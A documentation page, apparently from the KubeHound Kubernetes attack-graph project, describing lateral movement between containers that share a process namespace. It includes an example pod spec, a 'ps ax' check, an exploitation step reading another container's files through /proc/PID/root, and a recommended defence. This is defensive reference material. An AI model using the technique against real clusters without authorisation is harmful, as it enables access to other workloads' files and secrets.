---
title: SHARED_PS_NAMESPACE
---

<!--
id: SHARED_PS_NAMESPACE
TODO: phrase as an attack
name: "Access container in shared process namespace"
mitreAttackTechnique: N/A - N/A
mitreAttackTactic: TA0008 - Lateral Movement
-->

# SHARED_PS_NAMESPACE

| Source                      | Destination                           | MITRE                            |
| --------------------------- | ------------------------------------- |----------------------------------|
| [Container](../entities/container.md) | [Container](../entities/container.md) | [Lateral Movement, TA0008](https://attack.mitre.org/tactics/TA0008/) |

Represents a relationship between containers within the same pod that share a process namespace. 

## Details

Pods represent one or more containers with shared storage and network resources. Optionally, containers within the same pod can elect to share a process namespace with a flag in the pod spec.

## Prerequisites

Access to a container within a pod running other containers with shared process nanespaces

See the [example pod spec](https://github.com/DataDog/KubeHound/tree/main/test/setuptest-cluster/attacks/SHARED_PS_NAMESPACE.yaml).

## Checks

Consider the following spec, with two containers sharing a process namespace:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: nginx
spec:
  shareProcessNamespace: true
  containers:
  - name: nginx
    image: nginx
  - name: shell
    image: busybox:1.28
    securityContext:
      capabilities:
        add:
        - SYS_PTRACE
    stdin: true
    tty: true
```

From within the shell container, simply run:

```bash
ps ax
```

Without namespace sharing, no outside processes would be visible. However, with this specification we would expect an output similar to the below where the nginx processes from the other container are visible:

```bash
PID   USER     TIME  COMMAND
    1 root      0:00 /pause
    8 root      0:00 nginx: master process nginx -g daemon off;
   14 101       0:00 nginx: worker process
   15 root      0:00 sh
   21 root      0:00 ps ax
```

## Exploitation

Various options are possible here based on the attacker end goal. Ultimately it is possible to gain full control of other containers within the shared namespace. The easiest vector is to directly access the filesystem of the other container using the `/proc/$pid/root` link. Sticking with the previous example, running the below should display the contents of the nginx config file:

```bash
# run this inside the "shell" container
# change "8" to the PID of the Nginx process, if necessary
head /proc/8/root/etc/nginx/nginx.conf
```

## Defences

### Defence in depth

Prevent the use of shared namespaces in pods, where containers have different risk profiles. Ideally these types of containers should be run within separate pods.

## Calculation

+ [SharedPsNamespace](https://github.com/DataDog/KubeHound/tree/main/pkg/kubehound/graph/edge/shared_ps_namespace.go)

## References:

+ [Kubernetes API Reference Docs](https://kubernetes.io/docs/tasks/configure-pod-container/share-process-namespace/)
  